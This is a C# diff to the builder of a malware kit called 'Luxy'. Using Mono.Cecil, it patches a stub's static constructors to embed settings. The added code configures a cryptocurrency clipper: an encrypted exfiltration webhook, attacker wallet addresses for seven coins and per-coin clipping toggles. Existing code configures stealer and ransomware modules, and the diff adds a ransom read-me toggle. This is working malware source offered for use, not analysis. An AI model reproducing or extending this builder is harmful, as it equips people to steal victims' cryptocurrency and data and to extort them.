@@ -48,9 +48,106 @@ namespace Luxy.Components.Builder
                 // Stealer Settings
                 var settings_stealer = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Modules.Stealer.Settings");
                 var cctor_stealer = settings_stealer.GetStaticConstructor();
+                // Clipper Settings
+                var settings_clipper = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Modules.Clipper.Settings");
+                var cctor_clipper = settings_clipper.GetStaticConstructor();
+
 
                 var strings = 0;
                 var bools = 0;
+
+                // Clipper settings
+                foreach (var instruction in cctor_clipper.Body.Instructions)
+                {
+                    if (instruction.OpCode == OpCodes.Ldstr) // String
+                    {
+                        switch (++strings)
+                        {
+                            case 1: //key
+                                instruction.Operand = Convert.ToBase64String(key);
+                                break;
+
+                            case 2: // iv
+                                instruction.Operand = Convert.ToBase64String(iv);
+                                break;
+
+                            case 3: // encryptedWebhook
+                                instruction.Operand = Encrypt(Settings.WebhookClipper, key, iv);
+                                break;
+
+                            case 4: // btcAddr
+                                instruction.Operand = Encrypt(Settings.BtcAddr, key, iv);
+                                break;
+
+                            case 5: // ethAddr
+                                instruction.Operand = Encrypt(Settings.EthAddr, key, iv);
+                                break;
+
+                            case 6: // dogeAddr
+                                instruction.Operand = Encrypt(Settings.DogeAddr, key, iv);
+                                break;
+
+                            case 7: // ltcAddr
+                                instruction.Operand = Encrypt(Settings.LtcAddr, key, iv);
+                                break;
+
+                            case 8: // dashAddr
+                                instruction.Operand = Encrypt(Settings.DashAddr, key, iv);
+                                break;
+
+                            case 9: // xmrAddr
+                                instruction.Operand = Encrypt(Settings.XmrAddr, key, iv);
+                                break;
+
+                            case 10: // bchAddr
+                                instruction.Operand = Encrypt(Settings.BchAddr, key, iv);
+                                break;
+                        }
+                    }
+                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
+                    {
+                        switch (++bools)
+                        {
+                            case 1: // btcClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.BtcClip ? 1 : 0;
+                                break;
+
+                            case 2: // ethClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.EthClip ? 1 : 0;
+                                break;
+
+                            case 3: // dogeClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.DogeClip ? 1 : 0;
+                                break;
+
+                            case 4: // ltcClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.LtcClip ? 1 : 0;
+                                break;
+
+                            case 5: // dashClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.DashClip ? 1 : 0;
+                                break;
+
+                            case 6: // xmrClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.XmrClip ? 1 : 0;
+                                break;
+
+                            case 7: // bchClip
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.BchClip ? 1 : 0;
+                                break;
+                        }
+                    }
+                }
+
+                bools = 0;
+                strings = 0;
 
                 // Stealer settings
                 foreach (var instruction in cctor_stealer.Body.Instructions)
@@ -130,7 +227,7 @@ namespace Luxy.Components.Builder
                     }
                 }
 
-
+                bools = 0;
                 strings = 0;
 
                 // Ransomware settings
@@ -162,6 +259,16 @@ namespace Luxy.Components.Builder
 
                             case 6: // encryptedReadMeMessage
                                 instruction.Operand = Encrypt(Settings.ReadMeMessage, key, iv);
+                                break;
+                        }
+                    }
+                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
+                    {
+                        switch (++bools)
+                        {
+                            case 1: //Show Read Me Message
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = Settings.ShowReadMeMessage ? 1 : 0;
                                 break;
                         }
                     }
